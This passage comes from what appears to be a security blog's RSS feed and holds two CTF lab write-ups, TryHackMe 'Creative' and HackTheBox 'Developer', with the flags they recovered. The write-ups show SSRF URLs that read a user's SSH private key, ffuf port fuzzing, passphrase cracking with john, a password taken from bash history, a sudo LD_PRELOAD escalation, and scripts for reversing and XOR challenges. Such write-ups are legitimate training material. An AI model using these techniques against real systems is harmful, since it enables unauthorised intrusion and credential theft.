            <category>Password_generator</category>
        </item>
        <item>
            <title><![CDATA[TryHackMe - Creative]]></title>
            <link>https://www.sunsetaction.top/2025/07/05/TryHackMeCreative</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/05/TryHackMeCreative</guid>
            <pubDate>Sat, 05 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Creative https://tryhackme.com/room/creative | Easy info：Exploit a vulnerable web application and some misconfigurations to gain root privileges. Reco...]]></description>
            <content:encoded><![CDATA[
# Creative

> https://tryhackme.com/room/creative | `Easy`
> 

info：Exploit a vulnerable web application and some misconfigurations to gain root privileges.

![image.png](/post-images/TryHackMeCreative/image.png)

## Recon

```bash
➜  Creative nmap -sT -min-rate 10000 10.10.96.159             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:02 CST
Nmap scan report for 10.10.96.159
Host is up (0.35s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds
```

```bash
➜  Creative nmap -sT -A -p 22,80 10.10.96.159                                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:03 CST
Nmap scan report for 10.10.96.159
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:ff:e3:db:ba:78:82:20:fc:2c:97:dc:21:21:7e:ad (RSA)
|   256 89:7a:de:66:81:14:cd:ea:a8:46:a4:57:31:d8:d2:cf (ECDSA)
|_  256 07:78:87:81:7b:69:a7:d2:8b:5d:45:79:5d:85:cd:ca (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   216.65 ms 10.2.0.1
2   ... 3
4   343.32 ms 10.10.96.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.57 seconds
```

访问`HTTP`

![image.png](/post-images/TryHackMeCreative/image1.png)

经过一番搜索没法发现可以利用的，扫描一下子域名

```bash
➜  Creative ffuf -u 'http://creative.thm' -H 'host: FUZZ.creative.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs=178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 374ms]
:: Progress: [14512/114442] :: Job [1/1] :: 117 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

得到`beta`，访问

![image.png](/post-images/TryHackMeCreative/image2.png)

## SSRF

看着像是`SSRF`，输入我们`IP`尝试

```bash
➜  Creative nc -lvp 80  
listening on [any] 80 ...
connect to [10.2.7.57] from creative.thm [10.10.96.159] 33820
GET / HTTP/1.1
Host: 10.2.7.57
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

输入`127.0.0.1`

![image.png](/post-images/TryHackMeCreative/image3.png)

直接爆端口

```bash
➜  Creative seq 2000 > ports
```

```bash
➜  Creative ffuf -u 'http://beta.creative.thm' -X POST -d 'url=http://127.0.0.1:FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ports -fs=13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm
 :: Wordlist         : FUZZ: /root/Desktop/TryHackMe/Creative/ports
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 365ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 348ms]
:: Progress: [2000/2000] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

发现内部端口`1337` ，直接让服务器进行`SSRF`

![image.png](/post-images/TryHackMeCreative/image4.png)

我们再换成

```bash
http://127.0.0.1:1337/home
```

![image.png](/post-images/TryHackMeCreative/image5.png)

我们直接读取私钥

```bash
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```

![image.png](/post-images/TryHackMeCreative/image6.png)

## Crack

直接私钥登录

```bash
➜  Creative ssh saad@10.10.96.159 -i sshkey
Enter passphrase for key 'sshkey': 
```

需要密码，爆破

```bash
➜  Creative john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (sshkey)     
1g 0:00:00:31 DONE (2025-07-05 22:40) 0.03192g/s 30.65p/s 30.65c/s 30.65C/s hawaii..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

我们再登录

![image.png](/post-images/TryHackMeCreative/image7.png)

当前用户家目录下能读取到`user.txt`

```bash
saad@ip-10-10-96-159:~$ cat user.txt 
9a1ce90a7653d74ab98630b47b8b4a84
```

## Root

看到`gnupg` 感觉是要整这个

```bash
saad@ip-10-10-96-159:~$ ls -al
total 52
drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
drwxr-xr-x 4 root root 4096 Jul  5 13:57 ..
-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad 4096 Jan 20  2023 .cache
drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
drwx------ 3 saad saad 4096 Jan 20  2023 snap
drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
```

但是并不是，因为文件并不足够

我们又注意到`.bash_history` 竟然没有被重合向到`/dev/null`

```bash
saad@ip-10-10-96-159:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
```

得到密码 `MyStrongestPasswordYet$4291` ，啥看`sudo`权限

```bash
saad@ip-10-10-96-159:~$ sudo -l
Matching Defaults entries for saad on ip-10-10-96-159:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-96-159:
    (root) /usr/bin/ping
```

看到`env_keep+=LD_PRELOAD` 结束了

- `LD_PRELOAD` 可以在运行程序前强行加载你自定义的 `.so` 共享库。
- 如果这个库中实现了 `getuid()` 或其他标准函数，它就可以被优先加载、覆盖。
- 当你以 `sudo` 运行 `/bin/whoami`，就会先加载你的库，执行你指定的恶意代码

> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path
> 

![image.png](/post-images/TryHackMeCreative/image8.png)

`root.txt`

```bash
root@ip-10-10-96-159:~# cat root.txt 
992bfd94b90da48634aed182aae7b99f
```

## 总结

梭哈]]></content:encoded>
            <category>靶机</category>
            <category>TryHackMe</category>
            <category>Linux</category>
            <category>SSRF</category>
            <category>SUDO</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Developer]]></title>
            <link>https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer</guid>
            <pubDate>Sun, 22 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Developer https://app.hackthebox.com/machines/Developer | Linux | Hard Recon 访问 HTTP 可以创建账户，注册一个用户 sunset ，创建完毕后会直接进入后台 里面会有一些CTF题？让你做？ CTF PE...]]></description>
            <content:encoded><![CDATA[
# Machine - Developer

> https://app.hackthebox.com/machines/Developer | `Linux` | `Hard`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image.png)

## Recon

```bash
➜  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST 
Nmap scan report for 10.10.11.103
Host is up (0.092s latency).
Not shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 110.48 seconds
```

```bash
➜  Developer nmap -sT -A -p 22,80 10.10.11.103       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST
Nmap scan report for 10.10.11.103
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://developer.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   99.02 ms 10.10.16.1
2   99.78 ms 10.10.11.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.70 seconds
```

访问 `HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image1.png)

可以创建账户，注册一个用户 `sunset` ，创建完毕后会直接进入后台

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image2.png)

里面会有一些CTF题？让你做？

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image3.png)

## CTF

### PES

 题目会给出一个`EXE`文件合一串加密后的字符串：`X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC`

对程序进行反编译，在`PS2EXE`中的`Main`中能找到一串`base64`编码后的字符串

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image4.png)

解码后是加密的逻辑，通过`AI`写出解密脚本即可

```bash
# ===================================================================
# Decryption Script for FullCrypto
# We are reversing the logic from the original Encrypt-String function
# ===================================================================

# 加载必要的程序集
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Security")
Add-Type -AssemblyName System.Security

function Decrypt-String($base64String) {
    # --- 这些是我们在原脚本中找到的硬编码秘密 ---
    $Passphrase = "AmazinglyStrongPassword"
    $salt       = "CrazilySimpleSalt"
    $init       = "StupidlyEasy_IV"
    # ----------------------------------------------

    # 1. 准备 Rijndael (AES) 对象
    $r = New-Object System.Security.Cryptography.RijndaelManaged

    # 2. 准备密码和盐值的字节数组 (必须和加密时完全一样)
    $passBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
    $saltBytes = [System.Text.Encoding]::UTF8.GetBytes($salt)

    # 3. 生成密钥 (必须和加密时完全一样)
    # 使用 PasswordDeriveBytes, SHA1, 5次迭代, 生成32字节密钥
    $r.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes $passBytes, $saltBytes, "SHA1", 5).GetBytes(32)

    # 4. 生成 IV (必须和加密时完全一样)
    # 计算 IV 种子的 SHA1 哈希，并取前16个字节
    $r.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($init))[0..15]

    # 5. 从 Base64 字符串解码出加密后的字节数组
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($base64String)
    } catch {
        Write-Error "Invalid Base64 string. Cannot decrypt."
        return
    }

    # 6. 创建解密器并执行解密
    $c = $r.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream @(,$encryptedBytes)
    $cs = New-Object System.Security.Cryptography.CryptoStream $ms, $c, "Read"
    $sr = New-Object System.IO.StreamReader $cs

    # 7. 读取解密后的明文
    $decryptedString = $sr.ReadToEnd()

    # 8. 清理资源并返回结果
    $sr.Close()
    $cs.Close()
    $ms.Close()
    $r.Clear()

    return $decryptedString
}

# --- 使用方法 ---
# 将你在挑战中得到的加密字符串替换到下面的变量中
$encryptedData = "这里放你要解密的Base64字符串"

# 调用解密函数
$decryptedResult = Decrypt-String -base64String $encryptedData

# 输出解密结果
Write-Host "Decryption Result:" -ForegroundColor Green
Write-Host $decryptedResult

```

```bash
PS D:\System\Downloads\20250620> .\pass.ps1
Decryption Result:
DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}
```

### Phished List

给一个`xlsx`文件，听说文档中包含密码

像是隐写题，上网搜索了下，`docs`和`xlsx`基本上就是`zip`文件，我们对其进行解压

然后找到 `phished_credentials\xl\worksheets\sheet1.xml` ,在最底下能找到

```bash
<sheetProtection 
algorithmName="SHA-512" 
hashValue="Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==" 
saltValue="EoiHQklf0FagPs+iW0OzkA==" 
spinCount="100000" 
sheet="1" 
objects="1" 
scenarios="1"/>
```

我们将 `sheet1.xml` 的`sheetProtection` 块删掉后，再放进去替换掉原本的 `sheet1.xml` 即可

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image5.png)

```bash
DHTB{H1dD3N_C0LuMn5_FtW}
```

### Lucky Guess

压缩包解压后是一个程序，我们直接`IDA`打开

`winner`函数

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image6.png)

`AI`编写异或脚本

```bash
# C 代码中的变量
key = "98hKjr3f8CgfF"
ciphertext = "^w!%-%z2p7/# uw?"

# 用于存放解密结果的变量
plaintext = ""

# 遍历密文中的每一个字符
for i in range(len(ciphertext)):
    # 1. 取出密文字符和对应的密钥字符
    #    使用模运算 (%) 来实现密钥的循环使用
    cipher_char = ciphertext[i]
    key_char = key[i % len(key)]
    
    # 2. 进行异或 (XOR) 运算
    #    ord() 获取字符的ASCII码，^ 是异或操作符
    decrypted_char_code = ord(cipher_char) ^ ord(key_char)
    
    # 3. 应用特殊处理规则
    if decrypted_char_code <= 31:
        decrypted_char_code += 32
        
    # 4. 将解密后的ASCII码转换回字符，并拼接到结果字符串中
    #    chr() 将ASCII码转为字符
    plaintext += chr(decrypted_char_code)

# 按照格式输出最终的 Flag
flag = f"DHTB{{{plaintext}}}"
print(flag)
```

```bash
➜  Developer python getpass.py                                              
DHTB{gOInGWITHtHEfLOW}
```

### Authenication

I developed a new authentication mechanism using rust. Can you reverse my password?

`rust` 逆向

```bash
➜  Developer ./authenticate                                    
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
sdadad
You are unauthorized to use this application!
➜  Developer file authenticate 
authenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped
```

进去要你输入密码然后验证，`IDA`打开，找到验证的部分

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image7.png)

其中的这行代码正在执行 `v3 == v5` 的比较，并把结果（`true` 或 `false`）存起来

```bash
HIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::eq::h372d5aaf05c06316(
                                 &v3,
                                 &v5);
```

其中一个应该是用户输入的，然后和`v3` 或者 `v5` 去比较，所以我们要在`v3`或者`v5` 处断点，就可以看到是和什么在对比

```bash
➜  Developer pwndbg authenticate 
Reading symbols from authenticate...
pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
If you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on
pwndbg> info functions
...
0x0000000000008e30  main::validate
0x00000000000090f0  main::authenticated                                                                           
0x0000000000009130  main::check_password                                                                          
0x0000000000009240  main::main                 
0x0000000000009360  main   
...
pwndbg> disassemble 0x0000000000009130
...
   0x00000000000091af <+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   
   0x00000000000091b4 <+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   
   0x00000000000091b9 <+137>:   lea    rdi,[rsp+0x38]
   0x00000000000091be <+142>:   lea    rsi,[rsp+0x58]
   0x00000000000091c3 <+147>:   call   0x7a80 <_ZN4core3cmp5impls69_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$2eq17h372d5aaf05c06316E>
   0x00000000000091c8 <+152>:   mov    BYTE PTR [rsp+0x7],al                                                      
   0x00000000000091cc <+156>:   jmp    0x91ce <_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  
   0x00000000000091ce <+158>:   lea    rdi,[rsp+0x40]  
   0x00000000000091d3 <+163>:   call   0x9db0 <_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   
   0x00000000000091d8 <+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      
   0x00000000000091dc <+172>:   test   al,0x1 
...
```

`0x00000000000091c3` 是我们想要断点的地方，但是可能有`ALSR` ，我们不能直接断点

```bash
pwndbg> b main
Breakpoint 1 at 0x9360
pwndbg> r
────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x55555555d360 <main>                                                                                          push   rax
   0x55555555d361 <main+1>                                                                                        movsxd rax, edi                 RAX => 1
   0x55555555d364 <main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) ◂— sub rsp, 0xb8
   0x55555555d36b <main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] <= 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— '/root/Desktop/HackTheBox/Developer/authenticate'
   0x55555555d36f <main+15>                                                                                       mov    rsi, rax                 RSI => 1
   0x55555555d372 <main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— '/root/Desktop/HackTheBox/Developer/authenticate'
   0x55555555d376 <main+22>                                                                                       call   std::rt::lang_start         <std::rt::lang_start>
 
   0x55555555d37b <main+27>                                                                                       pop    rcx
   0x55555555d37c <main+28>                                                                                       ret    
 
   0x55555555d37d                                                                                                 nop    dword ptr [rax]
   0x55555555d380 <<alloc::vec::Vec<T> as alloc::vec::SpecExtend<&T,core::slice::iter::Iter<T>>>::spec_extend>    sub    rsp, 0x28
```

能看到地址都变成了`0x55555555dxxx`

```bash
0x555555554000 + 0x91c3 = 0x55555555d1c3
```

然后再在`0x55555555d1c3`处断点

```bash
pwndbg> b *0x55555555d1c3
Breakpoint 2 at 0x55555555d1c3
pwndbg> c
Continuing.
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
what（随便输入）
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image8.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image9.png)

可以看到 `what`是和`DHTB{rusty_bu5in3s5}` 在比较

```bash
➜  Developer ./authenticate
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
DHTB{rusty_bu5in3s5}
You have successfully authenticated!
```

```bash
DHTB{rusty_bu5in3s5}
```

### RevMe

直接就能拿到 `flag`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image10.png)

```bash
DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}
```

### PwnMe

`PWN`题目，checksec，`NX`和`PIE`都开了

```bash
➜  Developer checksec pwnme  
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Developer/pwnme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

但是貌似并不用看这个，也像是逆向题目，下边是`main`函数

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char s[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v6; // [rsp+18h] [rbp-18h]
  int v7; // [rsp+20h] [rbp-10h]
  char *v8; // [rsp+28h] [rbp-8h]

  if ( argc > 1 )
  {
    if ( (unsigned int)check_password(argv[1], argv, envp) )
    {
      puts("Password correct. Here's a flag:");
      *(_QWORD *)s = 0xC384B2CB92A49894LL;
      v6 = 0x8796C283C680B381LL;
      v7 = 13486015;
      v8 = s;
      while ( *v8 )
      {
        v3 = v8++;
        *v3 -= 80;
      }
      puts(s);
    }
    else
    {
      puts("Wrong password.");
    }
  }
  else
  {
    puts("Please enter your password as a program argument!");
  }
  return 0;
}
```

主要及时要看`check_password`

```bash
__int64 __fastcall check_password(const char *a1)
{
  char *v1; // rax
  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF
  char s2[16]; // [rsp+20h] [rbp-30h] BYREF
  char dest[16]; // [rsp+30h] [rbp-20h] BYREF
  char *v6; // [rsp+40h] [rbp-10h]
  unsigned int v7; // [rsp+4Ch] [rbp-4h]

  v7 = 0;
  strcpy(v3, "门赖旅惫杀緝");
  v6 = v3;
  while ( *v6 )
  {
    v1 = v6++;
    *v1 -= 80;
  }
  strcpy(dest, a1);
  strcpy(s2, v3);
  if ( !strcmp(dest, s2) )
    return 1;
  return v7;
}
```

`a1`是我们的键入的参数，主要的解密逻辑是在：

```bash
  while ( *v6 )
  {
    v1 = v6++;
    *v1 -= 80;
  }
```

程序遍历这个神秘字符串（`v3`）的每一个字节，并将每个字节的值减去 `80`

但是最后还是会在`if ( !strcmp(dest, s2) )` 处进行对比，我们还是在那断点，查看一下寄存器的值

我们要在`0x00000000000011de` 处断点

```bash
0x00000000000011d8 <+131>:   mov    rsi,rdx
0x00000000000011db <+134>:   mov    rdi,rax
0x00000000000011de <+137>:   call   0x1050 <strcmp@plt>
0x00000000000011e3 <+142>:   test   eax,eax
```

和之前一样，因为有`ALSR`，所以我们要在`main`处断点

```bash
 ► 0x5555555551f7 <main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)
   0x5555555551fb <main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] <= 1
   0x5555555551fe <main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] <= 0x7fffffffe078 —▸ 0x7fffffffe372 ◂— '/root/Desktop/HackTheBox/Developer/pwnme'
   0x555555555202 <main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x555555555206 <main+19>   ✘ jg     main+38                     <main+38>
 
   0x555555555208 <main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 ◂— 'Please enter your password as a program argument!'
   0x55555555520f <main+28>     call   puts@plt                    <puts@plt>
 
   0x555555555214 <main+33>     jmp    main+175                    <main+175>
    ↓
   0x5555555552a2 <main+175>    mov    eax, 0     EAX => 0
   0x5555555552a7 <main+180>    leave  
   0x5555555552a8 <main+181>    ret    
```

```bash
pwndbg> b *0x5555555551de
Breakpoint 2 at 0x5555555551de
pwndbg> c                                  
Continuing.                                                                                                       
                                                                                                                  
Breakpoint 2, 0x00005555555551de in check_password ()                                                             
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA 
───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────
*RAX  0x7fffffffdef0 ◂— 0x9700333231 /* '123' */                                                                  
 RBX  0x7fffffffe068 —▸ 0x7fffffffe36e ◂— '/root/Desktop/HackTheBox/Developer/pwnme'
*RCX  0x336e6179696173                                                                                                                                                                                                              
*RDX  0x7fffffffdee0 ◂— 'supersaiyan3'  
*RDI  0x7fffffffdef0 ◂— 0x9700333231 /* '123' */
*RSI  0x7fffffffdee0 ◂— 'supersaiyan3'
```

我们能看到寄存器上的值是`supersaiyan3`

```bash
➜  Developer ./pwnme supersaiyan3           
Password correct. Here's a flag:
DHTB{b4s1c0v3rF7ow}
```

### Esay Encryption

需要解密`DRwdFjIMJiYgOi4dOhI8OjQ=`

下载会给出一个异或脚本

```bash
#!/usr/bin/python3
from itertools import izip, cycle
import base64

def xor_crypt_string(data, key='**'):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    return base64.encodestring(xored).strip()

secret_data = "<REDACTED>"
print xor_crypt_string(secret_data)
```

但是我们不知道`key`是什么，但是我们能知道前五位是 `DHTB{`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image11.png)

我们反过来即可得到`flag`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image12.png)

### Triple Whammy

We've been told these keys hold a secret message, can you decode it?

```bash
c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e
fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b
7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f
```

解压后得到的脚本

```bash
import os
from secret import flag

def bxor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

key1 = os.urandom(len(flag))
key2 = os.urandom(len(flag))

ct1 = bxor(key1, flag)
ct2 = bxor(ct1, key2)
ct3 = bxor(key2, flag)

print(ct1.hex())
print(ct2.hex())
print(ct3.hex())
```

`AI`一把梭哈

```bash
#!/usr/bin/python3

def bxor(ba1, ba2):
    """Performs a byte-wise XOR operation on two byte strings."""
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

# 1. 从题目中获取的三个十六进制密文
hex_ct1 = "c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e"
hex_ct2 = "fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b"
hex_ct3 = "7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f"

# 2. 将十六进制字符串转换为字节（bytes）对象
ct1 = bytes.fromhex(hex_ct1)
ct2 = bytes.fromhex(hex_ct2)
ct3 = bytes.fromhex(hex_ct3)

